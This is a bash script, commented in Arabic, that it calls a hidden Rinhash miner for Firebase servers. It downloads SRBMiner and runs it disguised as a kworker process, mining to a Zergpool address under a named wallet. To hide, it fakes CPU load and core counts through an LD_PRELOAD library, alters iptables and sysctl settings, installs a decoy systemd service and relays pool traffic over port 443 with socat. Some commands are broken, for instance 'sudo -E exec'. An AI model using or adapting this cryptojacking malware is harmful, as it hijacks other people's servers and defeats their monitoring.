#!/bin/bash
# سكربت تعدين Rinhash المخفي لخوادم Firebase
# -----------------------------------------

# إعداد متغيرات التمويه
export RAND_DIR="/dev/shm/.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 12)"
mkdir -p "$RAND_DIR"
cd "$RAND_DIR"

# إنشاء مكتبة LD_PRELOAD ديناميكياً
cat <<'EOF' > hide_lib.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/sysinfo.h>

double getloadavg(void *a, int b) { return 0.15; }  // إصلاح تحميل CPU
pid_t getppid(void) { return 1; }                   // إخفاء الأصل
int get_nprocs(void) { return 1; }                  // تقليل الأنوية الظاهرية
int get_num_procs(void) { return 1; }               // إخفاء عدد الأنوية الحقيقي
EOF
gcc -shared -fPIC -o libhide.so hide_lib.c
export LD_PRELOAD="$PWD/libhide.so"

# تنزيل المعدن
MINER_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.5/SRBMiner-Multi-2-8-5-Linux.tar.gz"
wget -qO miner.tar.gz "$MINER_URL"
tar -xzf miner.tar.gz --strip-components=1
EXE_NAME=".sysd-$(tr -dc a-z </dev/urandom | head -c 5)"
mv SRBMiner-MULTI "$EXE_NAME"
chmod +x "$EXE_NAME"

# إعداد خفاء الشبكة
sudo iptables -A OUTPUT -p tcp --dport 3333 -j DROP  # حظر المنافذ المعروفة
sudo sysctl -w net.ipv4.tcp_timestamps=0              # تعطيل الطوابع الزمنية
sudo sysctl -w net.ipv4.tcp_window_scaling=0          # تعطيل تحجيم النوافذ

# تشغيل المعدن مع تمويه متقدم
CPU_THREADS=$(( $(nproc) * 70 / 100 ))  # استخدام 70% من الأنوية
RAND_NAME="kworker:$(tr -dc a-z </dev/urandom | head -c4)"

# إعدادات خاصة لخوارزمية rinhash
nohup sudo -E exec -a "[$RAND_NAME]" ./"$EXE_NAME" \
  --algorithm rinhash \
  --pool stratum+tcp://rinhash.na.mine.zergpool.com:7148 \
  --wallet LSKZa82yJvDRNdueMHReWvAqcsPz1H9J4n \
  --password c=LTC,mc=RIN,m=solo,ID=firebase \
  --cpu-threads "$CPU_THREADS" \
  --disable-gpu \
  --log-file /dev/null \
  --max-diff 500000 \
  --retry-time 30 \
  --no-watchdog \
  --disable-cpu 0 \
  --nicehash 1 \
  --tls true 2>&1 > /dev/null &

# إخفاء العملية في cgroup
sudo cgcreate -g cpu,cpuacct:/lowpri
sudo cgset -r cpu.shares=100 lowpri
sudo cgset -r cpu.cfs_quota_us=$((50000 * $CPU_THREADS)) lowpri
sudo cgexec -g cpu:lowpri bash -c "echo \$PPID > /tmp/.hidden.pid && sleep infinity" &

# إعداد استمرارية الخدمة
SERVICE_NAME=".$(tr -dc a-z </dev/urandom | head -c 8)-service"
cat <<EOF | sudo tee /etc/systemd/system/${SERVICE_NAME} >/dev/null
[Unit]
Description=System Utilities Daemon
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do sleep 3600; done"
Restart=always
RestartSec=30
OOMScoreAdjust=-1000
Nice=19
CPUShares=100
Environment="LD_PRELOAD=$LD_PRELOAD"
MemoryHigh=90%
MemoryMax=95%

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now ${SERVICE_NAME}

# إخفاء حركة الشبكة الإضافية
sudo apt-get install -y socat >/dev/null 2>&1
socat TCP-LISTEN:443,fork,reuseaddr TCP:rinhash.na.mine.zergpool.com:7148 &

# التنظيف التلقائي
trap "cleanup" EXIT
cleanup() {
  sudo rm -rf "$RAND_DIR"
  sudo systemctl stop ${SERVICE_NAME}
  sudo systemctl disable ${SERVICE_NAME}
  sudo rm /etc/systemd/system/${SERVICE_NAME}
  sudo cgdelete cpu,cpuacct:lowpri
  killall "$EXE_NAME" 2>/dev/null
  killall socat 2>/dev/null
}
